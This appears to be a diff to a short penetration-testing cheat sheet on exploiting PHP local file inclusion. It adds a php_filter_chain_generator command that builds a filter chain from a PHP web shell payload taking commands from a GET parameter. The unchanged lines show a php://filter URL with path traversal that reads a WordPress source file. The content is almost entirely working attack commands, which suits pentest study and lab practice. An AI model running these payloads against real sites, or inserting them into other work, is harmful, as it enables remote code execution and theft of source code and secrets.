@@ -2,6 +2,10 @@
 
 ### Tool: https://github.com/synacktiv/php_filter_chain_generator
 
+### Generate filter chain with the tool
+
+    python3 php_filter_chain_generator.py --chain '<?= exec($_GET[cmd]); ?>'
+
 ### If we find an LFI vulnerability and we use PHP filters to read a file for example:
 
     http://DOMAIN.LOCAL/whatever.php?lfi=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/wordpress/index.php
